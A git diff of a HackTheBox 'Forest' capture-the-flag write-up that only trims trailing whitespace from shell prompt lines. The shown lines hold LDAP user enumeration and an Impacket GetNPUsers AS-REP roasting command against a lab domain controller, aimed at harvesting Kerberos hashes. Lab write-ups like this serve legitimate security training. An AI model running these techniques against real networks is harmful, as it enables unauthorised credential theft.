@@ -106,7 +106,7 @@ Lets dive in this **to-do** list.
 ## Ldap
 
 ```bash	
-dumbland () hgfs/hackthebox/forest :: ldapsearch -h 10.10.10.161 -p 389 -x -s base namingcontexts                                                                                     255 ↵
+dumbland () hgfs/hackthebox/forest :: ldapsearch -h 10.10.10.161 -p 389 -x -s base namingcontexts
 # extended LDIF
 #
 # LDAPv3
@@ -231,7 +231,7 @@ CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=local
 Redirect this output to a file and after some scripts commands we can achieve a  list of valid ldap  users.  
 
 ```bash	
-dumbland () hgfs/hackthebox/forest :: cat user-list.txt | head -n 20                                                                                                                  127 ↵
+dumbland () hgfs/hackthebox/forest :: cat user-list.txt | head -n 20 
 $331000-VK4ADACQNUCA
 $D31000-NSEL5BRJ63V7
 Administrator
@@ -275,7 +275,7 @@ svc-alfresco
 Now its time to get some hashes. This is possibles because are some user with kerberos authentication disabled. See links in reference to get a better explanation.
 
 ```bash
-dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/GetNPUsers.py  -usersfile user-list.txt  htb.local/ -dc-ip 10.10.10.161 -no-pass                             130 ↵
+dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/GetNPUsers.py  -usersfile user-list.txt  htb.local/ -dc-ip 10.10.10.161 -no-pass
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
